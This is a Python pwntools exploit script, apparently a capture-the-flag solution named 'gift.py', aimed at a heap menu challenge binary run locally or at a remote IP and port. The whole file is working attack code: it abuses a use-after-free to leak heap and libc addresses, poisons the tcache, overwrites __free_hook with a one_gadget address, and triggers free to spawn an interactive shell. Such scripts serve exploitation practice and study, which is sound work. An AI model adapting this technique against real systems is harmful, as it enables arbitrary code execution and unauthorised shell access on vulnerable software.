# -*- encoding: utf-8 -*-
import os 
import requests
from pwn import * 
binary = './gift'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '123.56.236.86'
    port = '24372'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 10))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

def add(type , text = 'a\n'):
    cmd(2)
    sla('gift:' , type)
    sa('your gift!' , text)

def edit(idx , text):
    cmd(5)
    sla('index?' , idx)
    sa('How much?' , text)

def show(idx ):
    cmd(4)
    sla('index?' , idx)

def delete(idx ):
    cmd(3)
    sla('index?' , idx)

def attack():
    
    add(1 , flat(0 ,0x71)*(0xf0/8))
    add(1 , flat(0 ,0x71)*(0xf0/8))

    delete(0)
    delete(1)

    show(1)
    ru('cost: ')
    heap_base = rint(len('94615557386848')) - 0x260

    edit(1 , -0x50)

    add(1 )
    add(1)

    delete(3)
    delete(0)

    add(1 , flat( heap_base + 0x10 , 0)*0x10)
    add(2)
    add(2 , '\x07'*0x30 )
    delete(6)

    show(6)

    ru('cost: ')
    leak = rint(len('140444472249504'))

    __malloc_hook = leak - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)
    ogg = libc.address + 0x4f302

    add(1 , '\x01'*0x30 + p64(__free_hook - 0x10)*6)
    add(2 , p64(ogg))

    delete(1)
    # dbg()

    p.interactive()

attack()

'''
@File    :   gift.py
@Time    :   2022/08/17 11:33:26
@Author  :   Niyah 
'''
